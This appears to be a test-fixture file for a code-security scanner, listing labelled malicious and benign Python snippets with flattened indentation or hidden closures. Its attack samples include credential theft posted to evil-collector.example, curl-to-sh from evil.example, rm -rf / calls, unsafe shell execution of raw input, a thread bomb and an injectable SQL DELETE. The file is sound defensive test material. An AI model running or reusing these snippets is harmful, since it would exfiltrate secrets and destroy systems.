"""Code whose indentation was lost (pasted through a form, PDF or JSON) and behaviour hidden in closures, decorator wrappers and lambdas.
Each attack has a benign twin.  Scan-only; nothing here is executed."""

SEMANTIC_FLAT = []


def S(id_, cats, code, lang="python"):
    SEMANTIC_FLAT.append((id_, cats, code, lang))


# --- flattened (no leading whitespace at all)
S("f_def_with_post", "secret_access, data_exfiltration", "import os, requests\ndef steal():\nwith open(os.path.expanduser('~/.aws/credentials')) as f:\ndata = f.read()\nrequests.post('https://evil-collector.example/u', data=data)\nsteal()")
S("f_class_method_blank", "destructive_command", "import subprocess\nclass Runner:\ndef run(self, cmd):\nsubprocess.run(cmd, shell=True)\n\nRunner().run(input())")
S("f_class_method_noblank", "destructive_command", "import subprocess\nclass Runner:\ndef run(self, cmd):\nsubprocess.run(cmd, shell=True)\nRunner().run(input())")
S("f_func_then_call", "destructive_command", "import os\ndef wipe():\nos.system('rm -rf /')\nwipe()")
S("f_try_except", "destructive_command", "import os\ntry:\nos.system('rm -rf /')\nexcept Exception:\npass")
S("f_if_else", "obfuscated_execution", "import os\nx = 1\nif x == 1:\nos.system('curl http://evil.example/x.sh | sh')\nelse:\nprint('no')")
S("f_loop_threads", "resource_exhaustion", "import threading\ndef w():\nwhile True:\npass\nfor _ in range(500):\nthreading.Thread(target=w).start()")
S("f_sql_delete", "destructive_command", "import sqlite3\ndef q(name):\nconn = sqlite3.connect('a.db')\ncur = conn.cursor()\ncur.execute(\"DELETE FROM users WHERE name = '\" + name + \"'\")\nconn.commit()\n\nq(input())")
S("f_benign_nested", "benign", "def add(a, b):\nif a and b:\nreturn a + b\nreturn 0\nprint(add(1, 2))")
S("f_benign_class", "benign", "class Counter:\ndef __init__(self):\nself.n = 0\ndef inc(self):\nself.n += 1\nreturn self.n\nc = Counter()\nprint(c.inc())")
S("f_benign_try", "benign", "import json\ndef load(p):\ntry:\nwith open(p) as f:\nreturn json.load(f)\nexcept OSError:\nreturn {}\nprint(load('a.json'))")
S("f_benign_recursion", "benign", "def fact(n):\nif n <= 1:\nreturn 1\nreturn n * fact(n - 1)\nprint(fact(5))")

# --- behaviour inside functions that nothing calls directly
S("c_nested_uncalled", "destructive_command", "import os\ndef outer():\n    def inner():\n        os.system('rm -rf /')\n    return 1\n")
S("c_decorator_wrapper", "destructive_command", "import functools, subprocess\ndef deco(f):\n    @functools.wraps(f)\n    def inner(*a):\n        subprocess.run(['rm','-rf','/'])\n        return f(*a)\n    return inner\n\n@deco\ndef job():\n    pass\n\njob()\n")
S("c_lambda_call", "destructive_command", "import os\nf = lambda: os.system('rm -rf /')\n")
S("c_benign_decorator", "benign", "import functools, time\ndef timed(f):\n    @functools.wraps(f)\n    def inner(*a, **k):\n        t = time.time()\n        r = f(*a, **k)\n        print(time.time() - t)\n        return r\n    return inner\n\n@timed\ndef work():\n    return sum(range(10))\n\nwork()\n")
S("c_benign_closure", "benign", "def make_adder(n):\n    def add(x):\n        return x + n\n    return add\n\nprint(make_adder(2)(3))\n")
S("c_benign_lambda", "benign", "items = sorted([3, 1, 2], key=lambda x: -x)\nprint(items)\n")
